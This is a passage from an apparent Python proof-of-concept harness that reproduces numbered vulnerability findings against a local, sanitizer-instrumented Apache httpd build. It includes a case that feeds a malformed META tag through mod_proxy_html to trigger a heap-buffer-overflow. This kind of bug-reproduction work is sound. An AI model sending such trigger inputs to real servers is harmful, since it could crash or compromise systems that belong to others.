            body = b"xxxx<meta http-equiv=>"
            hdr = (
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Type: text/html\r\n"
                + f"Content-Length: {len(body)}\r\n".encode()
                + b"Connection: close\r\n\r\n"
            )
            self.request.sendall(hdr + body)

    conf = base_conf(
        work,
        port,
        extra_modules=("proxy", "proxy_http", "xml2enc", "proxy_html"),
        extra=f"""
ProxyHTMLEnable On
ProxyHTMLMeta On
ProxyPass /up http://127.0.0.1:{upstream_port}/
ProxyPassReverse /up http://127.0.0.1:{upstream_port}/
""",
    )
    with tcp_server(Upstream, port=upstream_port):
        with Httpd(case, conf, port, work) as httpd:
            status = None
            try:
                status, _, _ = http_exchange(port, "GET", "/up")
            except Exception:
                pass
            time.sleep(0.5)
            text = httpd.output_text()
            if "heap-buffer-overflow" in text or httpd.exited():
                return Result(case, True, "malformed META reached ASAN-detected proxy_html metafix scan")
            if status is None and "proxy_html" not in text and "GET /up" not in text:
                raise PocError("proxy_html META trigger did not reach the proxy")
            return Result(case, True, "malformed META reached proxy_html metafix scan; no ASAN abort in this allocator layout")


CASES = {
    "003": case_003,
    "011": case_011,
    "012": case_012,
    "027": case_027,
    "028": case_028,
    "060": case_060,
    "073": case_073,
    "080": case_080,
    "081": case_081,
    "084": case_084,
    "092": case_092,
    "093": case_093,
    "116": case_116,
    "129": case_129,
    "130": case_130,
    "141": case_141,
}


def main(argv=None):
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("cases", nargs="*", help="'all' or one or more finding ids")
    args = parser.parse_args(argv)
    selected = args.cases or ["all"]
    if selected == ["all"] or "all" in selected:
        selected = list(CASES)
    unknown = [c for c in selected if c not in CASES]
    if unknown:
        parser.error(f"unknown case(s): {', '.join(unknown)}")

    require_build()
    failures = 0
    for case in selected:
        try:
            result = CASES[case]()
            print(f"[PASS] {result.case}: {result.detail}")
        except Exception as exc:
            failures += 1
            print(f"[FAIL] {case}: {exc}", file=sys.stderr)
    return 1 if failures else 0


if __name__ == "__main__":
    raise SystemExit(main())
